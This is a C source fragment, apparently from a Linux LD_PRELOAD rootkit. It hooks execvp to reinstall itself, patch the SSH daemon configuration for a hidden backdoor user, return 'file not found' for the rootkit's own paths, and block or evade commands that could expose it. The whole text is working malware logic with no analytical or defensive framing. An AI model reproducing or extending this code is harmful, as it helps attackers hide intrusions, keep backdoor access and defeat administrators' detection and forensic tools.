int execvp(const char *filename, char *const argv[]){
#ifdef DO_REINSTALL
    if(!not_user(0)) reinstall();
#endif
#ifdef PATCH_SSHD_CONFIG
    sshdpatch(REG_USR);
#endif

    hook(CEXECVP);

    if(is_bdusr()){
#ifdef BACKDOOR_UTIL
        if(!fnmatch("*/bdv", argv[0], FNM_PATHNAME))
            do_hidingutil(argv);
#endif
#ifdef PATCH_SSHD_CONFIG
        if(!fnmatch("*/sshdpatch", argv[0], FNM_PATHNAME)){
            sshdpatch(MAGIC_USR);
            exit(0);
        }
#endif
        return (long)call(CEXECVP, filename, argv);
    }

    if(hidden_path(filename)){
        errno = ENOENT;
        return -1;
    }

#if defined(DO_REINSTALL) && defined(DO_EVASIONS)
    int evasion_status = evade(filename, argv, NULL);
    switch(evasion_status){
        case VEVADE_DONE:
            exit(0);
        case VINVALID_PERM:
            errno = CANTEVADE_ERR;
            return -1;
        case VFORK_ERR:
            return -1;
        case VFORK_SUC:
            return (long)call(CEXECVP, filename, argv);
        case VNOTHING_DONE:
            break;  /* ?? */
    }
#endif

#ifdef DO_EVASIONS
    if(block_strings(filename, argv)){
        errno = EPERM;
        return -1;
    }
#endif

    return (long)call(CEXECVP, filename, argv);
}
